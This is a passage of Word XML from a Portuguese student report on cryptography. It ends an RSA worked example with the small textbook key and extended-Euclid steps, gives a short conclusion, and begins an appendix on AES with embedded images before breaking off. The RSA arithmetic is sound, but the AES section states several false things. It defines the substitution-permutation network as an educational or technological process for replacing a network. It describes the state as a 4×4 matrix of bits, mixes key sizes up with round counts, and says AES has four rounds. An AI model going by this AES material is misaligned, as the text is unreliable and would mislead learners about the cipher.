        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Chave pública: (n, e) = (3233, 17)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476AD145" w14:textId="16999EA1" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="41"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Chave privada: d = 2753</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C890547" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A0E73B2" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67EB294B" w14:textId="3F9C4BA3" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>5. Encriptação e Desencriptação</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439C0B4C" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Mensagem: m = 65 ('A' em ASCII)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="546A2F69" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Encriptação: c = m^e mod n = 65^17 mod 3233 = 2790</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08A9AFF5" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Desencriptação: m = c^d mod n = 2790^2753 mod 3233 = 65</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1542CCA8" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70CFF130" w14:textId="47795871" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>6. Cálculo do Inverso Modular (Algoritmo de Euclides Estendido)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7464BE90" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>3120 = 17×183 + 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57EF8B87" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>17 = 9×1 + 8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC8A591" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>9 = 8×1 + 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B847840" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:pStyle w:val="PargrafodaLista"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="40"/>
        </w:numPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>8 = 1×8 + 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24062185" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A409EF2" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Retrocedendo:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1E6329" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>1 = 9 − 8×1 = 9 − (17 − 9×1)×1 = 9×2 − 17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CEED0A" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>Substituindo 9 = 3120 − 17×183 → 1 = (3120 − 17×183)×2 − 17 = 3120×2 − 17×367</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41688DF9" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="631B4E50" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Cambria Math" w:hAnsi="Cambria Math" w:cs="Cambria Math"/>
        </w:rPr>
        <w:t>⇒</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
        <w:t>≡</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
        <w:t>−</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">367 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:cs="Arial"/>
        </w:rPr>
        <w:t>≡</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 2753 (mod 3120)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2998507F" w14:textId="77777777" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AF6215">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>7. Conclusão</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4120D756" w14:textId="5354CE29" w:rsidR="00AF6215" w:rsidRPr="00AF6215" w:rsidRDefault="00AF6215" w:rsidP="00AF6215">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:t>O RSA é um exemplo perfeito da aplicação prática da teoria dos números. Usa exponenciação modular, inverso multiplicativo e propriedades dos números primos para criar um sistema seguro. O estilo 'clássico futurista' deste documento representa a união entre a matemática antiga e a tecnologia moderna.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635C7A8F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pageBreakBefore/>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DD6BBE1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="61F29136" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B9A2CE" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
      <w:r>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A778AD" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC">
      <w:pPr>
        <w:pStyle w:val="Cabealho"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68CD5565" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2851E7A6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="69308A9E" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0642BBE6" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="492F1AA1" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="2F1D758B" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="18333448" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="7F697F60" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="0D48822F" w14:textId="77777777" w:rsidR="004253CC" w:rsidRDefault="004253CC"/>
    <w:p w14:paraId="31B705BD" w14:textId="502A1286" w:rsidR="004253CC" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Ttulo1"/>
      </w:pPr>
      <w:bookmarkStart w:id="204" w:name="_Toc213874745"/>
      <w:bookmarkStart w:id="205" w:name="_Toc213881983"/>
      <w:r>
        <w:t xml:space="preserve">Apêndice E – </w:t>
      </w:r>
      <w:r w:rsidR="00236B3B">
        <w:t>AES -</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:bookmarkEnd w:id="204"/>
      <w:r w:rsidR="00FE74A6">
        <w:t>Davide Ferreira, nº2024</w:t>
      </w:r>
      <w:r w:rsidR="00AF6215">
        <w:t>154</w:t>
      </w:r>
      <w:bookmarkEnd w:id="205"/>
    </w:p>
    <w:p w14:paraId="6B0BD6FC" w14:textId="404377DC" w:rsidR="00FE74A6" w:rsidRDefault="00FE74A6">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAEDC13" w14:textId="26D5E854" w:rsidR="00FE74A6" w:rsidRPr="00842992" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>AES</w:t>
      </w:r>
      <w:r w:rsidR="00236B3B" w:rsidRPr="00842992">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Advanced Encryption Standard </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613DA14A" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">O que é: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14616C4D" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">O AES é um padrão global para simétrica, adotado pelo o governo dos Estados Unidos para utilizar mundialmente para proteger os dados sensíveis. É um algoritmo de criptografia que divide texto em blocos de tamanho fixo para utilizar em chaves simétricas. Os blocos normalmente são de 128 bits que podem ser suportados com chaves de 10,12 ou 14 rondas repetitivas. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78848655" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F226C35" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Como funciona: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369DF483" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">Funciona baseada em uma arquitetura conhecida como Rede de Substituição-Permutação que os blocos de 128 bits são organizados em uma matriz de 4 x 4 bits. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BA1576" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>O que é Rede Substituição-Permutação:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51D641D5" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">É um conceito usado em várias áreas como: Educação ou tecnologia para descrever um processo que um sistema existente para substituir um rede ou um sistema. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A86CC9" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Um Exemplo: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F621DC9" w14:textId="19D00994" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">O processo do AES é composto por 4 rondas. A mensagem utilizada é “This is a test!”.  </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251675648" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5B43A778" wp14:editId="0926351B">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>485140</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>457200</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4430395" cy="867410"/>
            <wp:effectExtent l="0" t="0" r="8255" b="8890"/>
            <wp:wrapNone/>
            <wp:docPr id="63428844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0395" cy="867410"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="421D556D" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="7A631348" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="45E7A572" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="62C2DCA8" w14:textId="32642DE6" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve">AES  - 128 : </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251674624" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4D7C92A4" wp14:editId="742B0B7A">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>409575</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>333375</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4706620" cy="539750"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="145700233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06620" cy="539750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6897F57E" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:r w:rsidRPr="00FE74A6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B1C229" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6"/>
    <w:p w14:paraId="04CC75CD" w14:textId="773E98E2" w:rsidR="00FE74A6" w:rsidRPr="00236B3B" w:rsidRDefault="00000000" w:rsidP="00FE74A6">
      <w:r>
        <w:pict w14:anchorId="5F2CFBB2">
          <v:rect id="_x0000_i1035" style="width:441.9pt;height:1.2pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B8DC165" w14:textId="77777777" w:rsidR="00236B3B" w:rsidRDefault="00236B3B">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1F290E" w14:textId="377C030C" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ronda 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251678720" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3F127492" wp14:editId="1E94769B">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>120015</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>219075</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="2120265" cy="1895475"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapNone/>
            <wp:docPr id="129740041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31">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="5040" r="5769"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2120265" cy="1895475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>- Sub Bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4276C1AC" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60F0B72D" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DB0356F" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BFE8F02" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FC11598" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D664834" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77ECC083" w14:textId="69A8EC37" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00FE74A6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="114300" distB="114300" distL="114300" distR="114300" simplePos="0" relativeHeight="251677696" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="420EDA75" wp14:editId="034ADA64">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>62865</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>190500</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5290185" cy="647700"/>
            <wp:effectExtent l="0" t="0" r="5715" b="0"/>
            <wp:wrapNone/>
            <wp:docPr id="183660704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32">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:srcRect l="1019" t="9024" r="952" b="15033"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5290185" cy="647700"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="50A268AF" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0196EE99" w14:textId="77777777" w:rsidR="00FE74A6" w:rsidRPr="00FE74A6" w:rsidRDefault="00FE74A6" w:rsidP="00FE74A6">
      <w:pPr>
        <w:rPr>
          <w:b/>
